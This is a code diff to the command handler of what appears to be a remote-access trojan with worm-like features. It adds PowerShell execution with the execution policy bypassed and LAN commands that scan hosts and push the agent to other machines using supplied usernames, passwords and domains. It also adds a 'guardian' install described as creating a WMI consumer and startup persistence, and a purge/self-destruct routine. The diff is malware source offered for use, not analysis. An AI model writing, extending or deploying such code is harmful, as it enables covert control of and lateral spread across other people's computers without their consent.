@@ -12,10 +12,17 @@ from __future__ import annotations
 
 import json
 import os
+import shlex
+import shutil
 import subprocess
+import tempfile
+import threading
 import time
 import traceback
 from typing import Callable
+
+from ..lan import discover as lan_discover
+from .. import guardian
 
 from . import (camera, files, inputs, persistence, runtime, screen, stealth, sysinfo,
                system, updater)
@@ -571,7 +578,17 @@ def cmd_powershell(agent, argument: str) -> None:
     if not argument:
         agent.reply("usage: ps1 <powershell command or expression>")
         return
-    shell(agent, f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "{argument}"')
+    path = os.path.join(tempfile.gettempdir(), "wu-run.ps1")
+    try:
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write(argument)
+        shell(agent, f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "{path}"')
+    finally:
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+        except OSError:
+            pass
 
 
 @command("py", "python")
@@ -590,7 +607,7 @@ def cmd_python(agent, argument: str) -> None:
     first_path = os.path.expanduser(first_token.strip('"'))
 
     if os.path.isfile(first_path):
-        cmd = [python_bin, first_path] + (rest.split() if rest else [])
+        cmd = [python_bin, first_path] + (shlex.split(rest) if rest else [])
     else:
         cmd = [python_bin, "-c", trimmed]
 
@@ -635,6 +652,87 @@ def cmd_exit(agent, argument: str) -> None:
     agent.reply("goodbye")
     time.sleep(0.3)
     os._exit(0)
+
+
+@command("deps.status")
+def cmd_deps(agent, argument: str):
+    from . import deps
+    return deps.status()
+
+
+@command("lan.state")
+def cmd_lan_state(agent, argument: str):
+    if not getattr(agent, "lan", None):
+        return "lan disabled"
+    return "beacon=%s peers=%s" % (bool(agent.lan), len(agent.lan.beacon.peers()) if agent.lan else 0)
+
+
+@command("lan.scan")
+def cmd_lan_scan(agent, argument: str):
+    if not getattr(agent, "lan", None):
+        return "lan disabled"
+    records = lan_discover.discover(force=True)
+    agent.send_json({"kind": "lan_scan", "hosts": list(records.values())})
+    return f"{len(records)} hosts"
+
+
+@command("lan.peers")
+def cmd_lan_peers(agent, argument: str):
+    if not getattr(agent, "lan", None):
+        return "lan disabled"
+    agent.send_json({"kind": "lan_peers", "peers": agent.lan.beacon.ask(1.5) if agent.lan else []})
+
+
+@command("lan.pull")
+def cmd_lan_pull(agent, argument: str):
+    if not getattr(agent, "lan", None):
+        return "lan disabled"
+    return str(agent.spreader.pull_from_peer({"ip": argument.strip()}))
+
+
+@command("lan.push")
+def cmd_lan_push(agent, argument: str):
+    if not getattr(agent, "lan", None):
+        return "lan disabled"
+    parts = argument.split()
+    ip = parts[0] if parts else ""
+    user = parts[1] if len(parts) > 1 else ""
+    password = parts[2] if len(parts) > 2 else ""
+    domain = parts[3] if len(parts) > 3 else ""
+    agent.send_json({"kind": "lan_push", "result":
+                     agent.spreader.push_host(ip, user, password, domain, verify=True)})
+
+
+@command("lan.spread")
+def cmd_lan_spread(agent, argument: str):
+    if not getattr(agent, "lan", None):
+        return "lan disabled"
+    agent.send_json({"kind": "lan_spread", "result": agent.spreader.scan_and_push()})
+
+
+@command("lan.refresh")
+def cmd_lan_refresh(agent, argument: str):
+    if not getattr(agent, "lan", None):
+        return "lan disabled"
+    agent.send_json({"kind": "lan_refresh", "result": agent.spreader.refresh_all()})
+
+
+@command("guardian.status")
+def cmd_guardian(agent, argument: str):
+    """Reports status of WMI consumer, shim, and startup approval."""
+    return "\n".join(f"{k:16} {v}" for k, v in guardian.status().items())
+
+
+@command("guardian.install")
+def cmd_guardian_install(agent, argument: str):
+    return "\n".join(guardian.install()) or "nothing to do"
+
+
+@command("purge")
+def cmd_purge(agent, argument: str):
+    agent.reply("purging...")
+    threading.Thread(target=lambda: (time.sleep(0.5), persistence.purge(), os._exit(0)),
+                     daemon=True).start()
 
 
 @command("uninstall", "self_destruct")
